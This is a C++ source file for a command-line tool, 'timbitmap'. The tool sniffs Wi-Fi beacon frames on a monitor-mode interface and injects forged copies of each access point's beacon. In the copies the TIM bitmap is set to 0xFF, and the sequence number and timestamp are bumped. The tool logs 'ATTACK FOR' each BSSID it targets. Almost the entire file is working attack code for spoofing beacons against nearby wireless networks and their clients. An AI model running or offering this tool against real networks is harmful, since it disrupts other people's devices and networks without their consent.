#include <cassert>
#include <cstdio>
#include <chrono>
#include <map>

#include <unistd.h>
#include <pcap.h>
#include "radiotap.h"
#include "beacon.h"
#include "gtrace.h"

typedef std::chrono::high_resolution_clock::time_point Clock;
typedef std::chrono::high_resolution_clock::duration Diff;
typedef std::chrono::high_resolution_clock Timer;

typedef std::map<Mac, Clock> AttackMap;
AttackMap attackMap;

void usage() {
	printf("syntax: timbitmap <interface>\n");
	printf("sample: timbitmap mon0\n");
}

int main(int argc, char* argv[]) {
	if (argc < 2) {
		usage();
		return -1;
	}

	gtrace_close();
	gtrace_open(nullptr, 0, true, nullptr);

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, -1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
		return -1;
	}
	if (argc >= 3) {
		char* filter = argv[2];
		u_int uNetMask= 0xFFFFFFFF;
		bpf_program code;

		int res = pcap_compile(handle, &code, filter, 1, uNetMask);
		if (res < 0) {
			fprintf(stderr, "pcap_compile return %d - %s\n", res, pcap_geterr(handle));
			return -1;
		}

		res = pcap_setfilter(handle, &code);
		if (res < 0) {
			fprintf(stderr, "pcap_setfilter return %d - %s\n", res, pcap_geterr(handle));
			return -1;
		}
	}

	Timer timer;
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		u_char* end = const_cast<u_char*>(packet);
		end += header->caplen;
		RadiotapHdr* radiotapHdr = PRadiotapHdr(packet);
		le16_t len = radiotapHdr->len_;
		if ((void*)radiotapHdr >= (void*)end) {
			GTRACE("invalid pointer %p %p\n", (void*)radiotapHdr, (void*)end);
			continue;
		}
		if (len != sizeof(RadiotapHdr) && len != 18 && len != 13) {
			GTRACE("invalid radiotap header len %u %p %p\n", len, (void*)radiotapHdr, (void*)end);
			continue;
		}
		if (len == sizeof(RadiotapHdr) || len == 13) continue;
		BeaconHdr* beaconHdr = PBeaconHdr(packet + radiotapHdr->len_);
		if (beaconHdr->typeSubtype() != Dot11Hdr::Beacon) continue;

		//GTRACE("radio len=%d caplen=%u\n", radiotapHdr->len_, header->caplen);

		BeaconHdr::TaggedParameters::Tag* tag = &beaconHdr->tagged_.tag_;
		while ((void*)tag < (void*)end) {
			if (tag->num_ == BeaconHdr::tagTrafficIndicationMap) {
				BeaconHdr::TrafficIndicationMap* tim = BeaconHdr::PTrafficIndicationMap(tag);

				le8_t bitmap = tim->bitmap_;
				if (bitmap == 0xFF) {
					//GTRACE("bitmap=0x%X\n", tim->bitmap_);
					break;
				}
				bool attack = true;
				Clock now = timer.now();
				Mac bssid = beaconHdr->bssid();
				AttackMap::iterator it = attackMap.find(bssid);
				if (it == attackMap.end()) {
					attackMap.insert({bssid, now});
					it = attackMap.find(bssid);
					assert(it != attackMap.end());
				} else {
					Clock last = it->second;
					Diff diff = now - last;
					//GTRACE("diff=%lu\n", diff.count());
					if (diff.count() < 3000000000) // 3 sec
						attack = false;
				}
				if (attack) {
					GTRACE("ATTACK FOR %s\n", std::string(bssid).c_str());

					le16_t seq = beaconHdr->seq_;
					le64_t timestamp = beaconHdr->fixed_.timestamp_;
					beaconHdr->seq_ = seq + 1;
					static __useconds_t timstampIncment = 100000; // 100 msec
					beaconHdr->fixed_.timestamp_ = timestamp + le64_t(timstampIncment); // gilgil temp
					tim->bitmap_ = 0xFF;

					char sendBuf[65536];
					RadiotapHdr* sendRadiotapHdr = (RadiotapHdr*)sendBuf;
					sendRadiotapHdr->len_ = sizeof(RadiotapHdr);
					sendRadiotapHdr->pad_ = 0;
					sendRadiotapHdr->ver_ = 0;
					sendRadiotapHdr->present_ = 0;
					BeaconHdr* sendBeaconHdr = PBeaconHdr(sendBuf + sizeof(RadiotapHdr));
					uint32_t copyLen = header->caplen - radiotapHdr->len_;
					assert(copyLen < 10000);
					memcpy(sendBeaconHdr, beaconHdr, copyLen);
					uint32_t writeLen = sizeof(RadiotapHdr) + copyLen;

					usleep(timstampIncment - 10000); // -10 msec
					for (int i = 0; i < 10; i++) {
						sendBeaconHdr->fixed_.timestamp_ += 1000; // +1 msec
						int res = pcap_sendpacket(handle, (const u_char*)sendBuf, writeLen);
						if (res != 0) {
							fprintf(stderr, "pacp_sendpacket return %d - %s\n", res, pcap_geterr(handle));
						}
						usleep(1000); // 1 msec
					}
					it->second = now;
				}
				break;

			}
			tag = tag->next();
		}
	}

	pcap_close(handle);
}
